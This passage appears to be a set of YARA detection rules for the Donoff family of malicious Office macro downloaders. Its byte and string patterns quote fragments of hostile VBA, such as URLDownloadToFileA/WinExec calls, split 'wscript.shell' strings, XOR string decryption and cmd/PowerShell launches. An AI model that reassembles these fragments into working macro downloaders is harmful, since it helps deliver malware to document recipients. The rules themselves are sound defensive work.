        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "18"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {61 74 74 72 69 62 75 74 65 20 76 62 5f 6e 61 6d 65 20 3d 20 22 6d 6f 64 65 22 0d 0a 73 75 62 20 [0-96] 28 29 0d 0a 0d 0a}  //weight: 5, accuracy: Low
        $x_5_2 = {20 3d 20 22 22 20 74 68 65 6e 0d 0a 73 68 65 6c 6c 20 [0-96] 2c 20 66 61 6c 73 65 0d 0a 65 6e 64 20 69 66 0d 0a 65 6e 64 20 73 75 62 0d 0a 73 75 62 20 61 75 74 6f 6f 70 65 6e 28 29}  //weight: 5, accuracy: Low
        $x_5_3 = {20 3d 20 22 22 20 74 68 65 6e 0d 0a 73 68 65 6c 6c 20 [0-96] 2c 20 76 62 68 69 64 65 0d 0a 65 6e 64 20 69 66 0d 0a 65 6e 64 20 73 75 62 0d 0a 73 75 62 20 61 75 74 6f 6f 70 65 6e 28 29}  //weight: 5, accuracy: Low
        $x_5_4 = {20 3d 20 22 22 20 74 68 65 6e 0d 0a 73 68 65 6c 6c 20 [0-96] 2c 20 30 0d 0a 65 6e 64 20 69 66 0d 0a 65 6e 64 20 73 75 62 0d 0a 73 75 62 20 61 75 74 6f 6f 70 65 6e 28 29}  //weight: 5, accuracy: Low
        $x_5_5 = "= activedocument.defaulttablestyle" ascii //weight: 5
        $x_1_6 = {20 3d 20 22 63 6d 64 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_7 = {20 3d 20 22 68 74 74 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_8 = {20 3d 20 22 64 6f 77 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_9 = {20 3d 20 22 65 27 22 22 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_10 = {20 3d 20 22 63 6d 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_11 = {20 3d 20 22 2f 2f 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_12 = {20 3d 20 22 22 22 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_13 = {20 3d 20 22 27 22 22 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_14 = {20 3d 20 22 2f 63 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_15 = {20 3d 20 22 78 65 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_16 = {20 3d 20 22 68 74 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_17 = {20 3d 20 22 65 78 65 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_18 = {20 3d 20 22 2e 65 78 22 0d 0a}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 13 of ($x_1_*))) or
            ((2 of ($x_5_*) and 8 of ($x_1_*))) or
            ((3 of ($x_5_*) and 3 of ($x_1_*))) or
            ((4 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_DT_2147719325_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DT"
        threat_id = "2147719325"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub AutoFilter_Clear(Optional stringWksName As String)" ascii //weight: 1
        $x_1_2 = "= CLng(Left(stringTime, intColon01 - 1))" ascii //weight: 1
        $x_1_3 = "Call Optimize_VBA_Performance(False, xlAutomatic)" ascii //weight: 1
        $x_1_4 = "Debug.Print \"Form is not visible. The code will now stop.\": End" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DT_2147719325_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DT"
        threat_id = "2147719325"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "21"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {73 20 3d 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 43 6f 64 65 4e 61 6d 65 02 00 49 66 20 22 54 68 69 73 44 6f 63 75 6d 65 6e 74 22 20 3d 20 73 20 54 68 65 6e 20 6a 20 3d 20 6a 20 2d 20 31 02 00 46 6f 72 20 69 20 3d 20 31 20 54 6f 20 33 32 02 00 6a 20 3d 20 32 20 2a 20 6a 02 00 4e 65 78 74 20 69}  //weight: 10, accuracy: Low
        $x_10_2 = {46 6f 72 20 0f 00 20 3d 20 30 20 54 6f 20 55 42 6f 75 6e 64 28 0f 00 29 02 00 49 66 20 0f 00 28 0f 00 29 20 3d 20 0f 00 28 0f 00 29 20 54 68 65 6e 20 0f 00 20 3d 20 0f 00 20 2b 20 31 02 00 4e 65 78 74 02 00 49 66 20 0f 00 20 3d 20 30 20 54 68 65 6e 02 00 0f 00 20 3d 20 0f 00 20 2b 20 43 68 72 24 28 0f 00 28 0f 00 29 20 2d 20 01 00 29}  //weight: 10, accuracy: Low
        $x_1_3 = {46 75 6e 63 74 69 6f 6e 20 66 75 6e 63 32 28 29 02 00 66 6f 72 6d 31 2e 43 6f 6d 6d 61 6e 64 42 75 74 74 6f 6e 31 2e 54 61 67}  //weight: 1, accuracy: Low
        $x_1_4 = "Function Func_two()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_DV_2147719398_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DV"
        threat_id = "2147719398"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(0) = \"cm" ascii //weight: 1
        $x_1_2 = {29 20 3d 20 22 65 78 [0-2] 22 0d 0a}  //weight: 1, accuracy: Low
        $x_1_3 = {29 20 3d 20 22 2e 65 78 [0-1] 22 0d 0a}  //weight: 1, accuracy: Low
        $x_1_4 = {29 20 3d 20 22 65 27 22 22 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_5 = {29 20 3d 20 22 22 22 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_6 = {20 3d 20 63 72 65 61 74 65 6f 62 6a 65 63 74 28 [0-96] 29 0d 0a}  //weight: 1, accuracy: Low
        $x_3_7 = {29 20 3d 20 22 [0-4] 22 0d 0a [0-96] 20 3d 20 6a 6f 69 6e 28 [0-96] 2c 20 [0-96] 29 0d 0a [0-96] 2e 72 75 6e 20 [0-96] 2c 20 [0-16] 0d 0a}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((6 of ($x_1_*))) or
            ((1 of ($x_3_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_DY_2147719477_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DY"
        threat_id = "2147719477"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (Hex2Str(EnDecryptMUR" ascii //weight: 1
        $x_1_2 = "CryptString = CryptString & Chr$(Val(EnDecryptMUR(" ascii //weight: 1
        $x_1_3 = "EnDecryptMUR = EnDecryptMUR & Chr$(Asc(Mid$(sString, I, 1)) Xor iLng)" ascii //weight: 1
        $x_1_4 = "iLng = Asc(Mid$(sPass, ((I Mod Len(sPass)) + 1), 1))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DZ_2147719483_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DZ"
        threat_id = "2147719483"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "26"
        strings_accuracy = "Low"
    strings:
        $x_20_1 = {41 72 72 61 79 28 4a 6f 69 6e 28 41 72 72 61 79 28 10 00 29 28 30 29 2c 20 22 22 29 29 28 30 29 02 00 10 00 2e 52 75 6e 20 10 00 2c 20 76 62 48 69 64 65}  //weight: 20, accuracy: Low
        $x_1_2 = "\"cM\")(1)" ascii //weight: 1
        $x_1_3 = "\"D.\")(1)" ascii //weight: 1
        $x_1_4 = "\"/s\")(1)" ascii //weight: 1
        $x_1_5 = "\"ea\")(1)" ascii //weight: 1
        $x_1_6 = "\"rc\")(1)" ascii //weight: 1
        $x_1_7 = "\"h.\")(1)" ascii //weight: 1
        $x_1_8 = "\"ph\")(1)" ascii //weight: 1
        $x_1_9 = "\"p'\")(1)" ascii //weight: 1
        $x_1_10 = "\"Do\")(1)" ascii //weight: 1
        $x_1_11 = "\"Wn\")(1)" ascii //weight: 1
        $x_1_12 = "\"Fi\")(1)" ascii //weight: 1
        $x_1_13 = "\"Le\")(1)" ascii //weight: 1
        $x_1_14 = "\"ht\")(1)" ascii //weight: 1
        $x_1_15 = "\"tp\")(1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_20_*) and 6 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_EA_2147719524_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EA"
        threat_id = "2147719524"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-15] 29 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 28 30 2c 20 [0-15] 2c 20 [0-15] 2c 20 30 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 41 72 72 61 79 28 57 69 6e 45 78 65 63 28 [0-15] 20 26 20 [0-15] 2c 20 46 61 6c 73 65 29 29 28 30 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_ED_2147719541_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.ED"
        threat_id = "2147719541"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "), Environ(Array(" ascii //weight: 1
        $x_1_2 = "= URLDownloadToFileA(0, Array(" ascii //weight: 1
        $x_1_3 = "= Array(WinExec(Array(" ascii //weight: 1
        $x_1_4 = "Private Declare PtrSafe Function URLDownloadToFileA Lib \"urlmon\" (ByVal" ascii //weight: 1
        $x_1_5 = "Private Declare PtrSafe Function WinExec Lib \"kernel32\" (ByVal" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EF_2147719616_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EF"
        threat_id = "2147719616"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ") = \"wsc\"" ascii //weight: 1
        $x_1_2 = ") = \"ri\"" ascii //weight: 1
        $x_1_3 = ") = \"pt.s\"" ascii //weight: 1
        $x_1_4 = ") = \"hel\"" ascii //weight: 1
        $x_1_5 = ") = \"l\"" ascii //weight: 1
        $x_1_6 = {2e 52 75 6e 28 15 00 2c 20 15 00 29 0d 0a}  //weight: 1, accuracy: Low
        $x_1_7 = {22 20 4c 69 6b 65 20 22 2a 22 20 26 20 15 00 20 26 20 22 2a 22}  //weight: 1, accuracy: Low
        $x_1_8 = {20 3d 20 41 73 63 28 22 47 22 29 20 2d 20 37 31 0d 0a}  //weight: 1, accuracy: High
        $x_1_9 = {20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 4a 6f 69 6e 28 15 00 2c 20 22 22 29 29 0d 0a}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (8 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EG_2147719727_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EG"
        threat_id = "2147719727"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 6d 22 [0-16] 3d 20 22 64 22 [0-16] 3d 20 22 20 22 [0-16] 3d 20 22 2f 22 [0-64] 3d 20 22 20 22 [0-16] 3d 20 22 70 22 [0-64] 3d 20 22 6f 22 [0-16] 3d 20 22 77 22 [0-64] 3d 20 22 72 22 [0-64] 3d 20 22 73 22 [0-16] 3d 20 22 68 22}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 22 42 22 [0-16] 3d 20 22 79 22 [0-16] 3d 20 22 50 22 [0-64] 3d 20 22 61 22 [0-16] 3d 20 22 73 22 [0-16] 3d 20 22 73 22 [0-16] 3d 20 22 20 22 [0-16] 3d 20 22 2d 22 [0-16] 3d 20 22 4e 22 [0-16] 3d 20 22 6f 22 [0-16] 3d 20 22 50 22 [0-64] 3d 20 22 72 22 [0-16] 3d 20 22 6f 22 [0-16] 3d 20 22 66 22}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 22 6c 22 [0-16] 3d 20 22 27 22 [0-16] 3d 20 22 2b 22 [0-16] 3d 20 22 27 22 [0-16] 3d 20 22 6f 22 [0-16] 3d 20 22 61 22 [0-16] 3d 20 22 64 22 [0-16] 3d 20 22 66 22 [0-16] 3d 20 22 69 22 [0-16] 3d 20 22 6c 22}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 22 73 22 [0-16] 3d 20 22 74 22 [0-16] 3d 20 22 61 22 [0-16] 3d 20 22 72 22 [0-16] 3d 20 22 54 22 [0-16] 3d 20 22 2d 22 [0-16] 3d 20 22 50 22 [0-16] 3d 20 22 72 22 [0-16] 3d 20 22 6f 22}  //weight: 1, accuracy: Low
        $x_1_5 = " + \"/goodtotry/\"" ascii //weight: 1
        $x_1_6 = {3d 20 41 72 72 61 79 28 22 ?? ?? [0-16] 22 2c 20 53 68 65 6c 6c 28 ?? ?? ?? ?? [0-16] 2c 20 30 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EH_2147720008_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EH"
        threat_id = "2147720008"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "21"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = "If (ActiveDocument.EmbedLinguisticData) Then" ascii //weight: 10
        $x_10_2 = {4e 65 78 74 20 [0-16] 0d 0a [0-16] 20 3d 20 53 68 65 6c 6c 28 [0-10] 2c 20 [0-10] 29}  //weight: 10, accuracy: Low
        $x_1_3 = {46 75 6e 63 74 69 6f 6e 20 [0-16] 28 29 0d 0a [0-16] 20 3d 20 45 6d 70 74 79 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_4 = {46 75 6e 63 74 69 6f 6e 20 [0-16] 28 29 0d 0a [0-16] 20 3d 20 45 6d 70 74 79 0d 0a [0-16] 20 3d 20 [0-16] 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_5 = {46 75 6e 63 74 69 6f 6e 20 [0-16] 28 29 0d 0a [0-16] 20 3d 20 46 61 6c 73 65 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_6 = {46 75 6e 63 74 69 6f 6e 20 [0-16] 28 29 0d 0a [0-16] 20 3d 20 46 61 6c 73 65 0d 0a [0-16] 20 3d 20 [0-16] 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_7 = {46 75 6e 63 74 69 6f 6e 20 [0-16] 28 29 0d 0a [0-16] 20 3d 20 54 72 75 65 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_EK_2147720141_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EK"
        threat_id = "2147720141"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 42 79 4e 61 6d 65 20 [0-16] 2c 20 73 28 [0-3] 2c 20 22 03 04 04 04 65 70 4f 6e 6e 65 70 4f 70 4f 6e 65 22 2c 20 [0-3] 29 2c 20 31 2c 20 73 28 [0-3] 2c 20 22 45 47 54 22 2c 20 [0-3] 29 2c 20 73 28}  //weight: 1, accuracy: Low
        $x_1_2 = {28 41 72 72 61 79 28 73 28 [0-3] 2c 20 22 03 06 06 06 4d 41 4e 4f 5a 41 4e 4f 5a 41 4d 41 41 4d 41 4e 4f 5a 22 2c 20 [0-3] 29 2c 20 73 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EL_2147720142_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EL"
        threat_id = "2147720142"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(b(1009, 1094, \";.W-z(jdp.Ois(FD;.QtI) et..tcBtI E;MehcXsreq.ztNcj(qTUOK$eIpwtU)VnelmeOlC)je;ede:t;" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EM_2147720143_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EM"
        threat_id = "2147720143"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 43 68 72 28 28 28 [0-26] 20 2d 20 36 35 20 2b 20 [0-16] 29 20 4d 6f 64 20 32 36 29 20 2b 20 36 35 29 0d 0a 43 61 73 65 20 39 37 20 54 6f 20 31 32 32}  //weight: 1, accuracy: Low
        $x_1_2 = {44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 0d 0a [0-16] 20 [0-16] 28 22 ?? ?? ?? ?? 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = {29 2c 20 31 0d 0a 41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e 20 22 [0-16] 22 0d 0a 45 78 69 74 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EO_2147720151_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EO"
        threat_id = "2147720151"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "array(\"cmd\"" ascii //weight: 1
        $x_1_2 = {61 72 72 61 79 28 2d ?? 2c 20 22 63 6d 64 22}  //weight: 1, accuracy: Low
        $x_1_3 = {61 72 72 61 79 28 2d ?? 2c 20 2d ?? 2c 20 22 63 6d 64 22}  //weight: 1, accuracy: Low
        $x_1_4 = {61 72 72 61 79 28 2d ?? 2c 20 2d ?? 2c 20 2d ?? 2c 20 22 63 6d 64 22}  //weight: 1, accuracy: Low
        $x_1_5 = {61 72 72 61 79 28 2d ?? 2c 20 2d ?? 2c 20 2d ?? 2c 20 2d ?? 2c 20 22 63 6d 64 22}  //weight: 1, accuracy: Low
        $x_1_6 = "NaN, \"cmd\"" ascii //weight: 1
        $x_1_7 = "array(\".ex\"" ascii //weight: 1
        $x_1_8 = {61 72 72 61 79 28 2d ?? 2c 20 22 2e 65 78 22}  //weight: 1, accuracy: Low
        $x_1_9 = {61 72 72 61 79 28 2d ?? 2c 20 2d ?? 2c 20 22 2e 65 78 22}  //weight: 1, accuracy: Low
        $x_1_10 = {61 72 72 61 79 28 2d ?? 2c 20 2d ?? 2c 20 2d ?? 2c 20 22 2e 65 78 22}  //weight: 1, accuracy: Low
        $x_1_11 = {61 72 72 61 79 28 2d ?? 2c 20 2d ?? 2c 20 2d ?? 2c 20 2d ?? 2c 20 22 2e 65 78 22}  //weight: 1, accuracy: Low
        $x_1_12 = "NaN, \".ex\"" ascii //weight: 1
        $x_1_13 = {49 66 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 63 72 69 70 74 73 2e 43 6f 75 6e 74 20 3d 20 30 20 54 68 65 6e 0d 0a ?? ?? ?? ?? [0-10] 20 3d 20 ?? ?? ?? [0-5] 20 26 20 ?? ?? ?? [0-5] 20 26 20 ?? ?? ?? [0-5] 20 26}  //weight: 1, accuracy: Low
        $x_1_14 = "If VarType(ActiveWorkbook.Name)" ascii //weight: 1
        $x_1_15 = "If ActiveDocument.Tables.Count = 0 Then" ascii //weight: 1
        $x_1_16 = "If Application.Build > 100 Then" ascii //weight: 1
        $x_1_17 = "If Application.ActiveEncryptionSession Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EP_2147720180_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EP"
        threat_id = "2147720180"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(0) = \"wscri\"" ascii //weight: 1
        $x_1_2 = "(1) = \"pt.s\"" ascii //weight: 1
        $x_1_3 = "(2) = \"hell\"" ascii //weight: 1
        $x_1_4 = {3d 20 4a 6f 69 6e 28 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-10] 2c 20 22 22 29 0d 0a 27}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PA_2147720231_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PA"
        threat_id = "2147720231"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Shell \"cmd.exe /v:ON /c\" + Chr(34) + \"set" ascii //weight: 1
        $x_1_2 = {22 20 26 26 20 25 74 6d 70 25 2f [0-16] 2e 65 78 65 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EQ_2147720234_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EQ"
        threat_id = "2147720234"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 2a 22 0d 0a}  //weight: 1, accuracy: High
        $x_1_2 = {2e 73 68 65 6c 6c 65 78 65 63 75 74 65 20 22 63 6d 64 2e 65 78 65 22 2c 20 [0-32] 2c 20 22 22 2c 20 22 6f 70 65 6e 22 2c 20 30 0d 0a}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 28 29 29 2e 52 75 6e 28 [0-16] 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_4 = {20 3d 20 4d 69 64 28 [0-32] 2c 20 [0-32] 2c 20 31 29 0d 0a}  //weight: 1, accuracy: Low
        $x_1_5 = {49 66 20 4e 6f 74 20 22 [0-32] 22 20 4c 69 6b 65 20 [0-32] 20 54 68 65 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_ES_2147720306_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.ES"
        threat_id = "2147720306"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 0d 0a 44 69 6d 20 ?? ?? ?? ?? ?? ?? [0-1] 20 41 73 20 49 6e 74 65 67 65 72}  //weight: 1, accuracy: Low
        $x_1_2 = {45 6e 64 20 49 66 0d 0a 27 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-16] 0d 0a ?? ?? ?? ?? ?? ?? [0-2] 20 3d 20 ?? ?? ?? ?? ?? ?? [0-3] 28 22 ?? ?? ?? ?? [0-2] 22 2c 20 22 63 ?? ?? ?? ?? [0-2] 6d ?? ?? ?? ?? [0-2] 64}  //weight: 1, accuracy: Low
        $x_1_3 = {45 6e 64 20 49 66 0d 0a ?? ?? ?? ?? ?? [0-2] 20 3d 20 ?? ?? ?? ?? ?? ?? [0-3] 28 22 ?? ?? ?? ?? [0-2] 22 2c 20 22 3a ?? ?? ?? ?? [0-2] 2f ?? ?? ?? ?? [0-2] 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_ER_2147720339_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.ER"
        threat_id = "2147720339"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "+ Array(\"cmd.exe /c \"\"powershe\")(0)" ascii //weight: 1
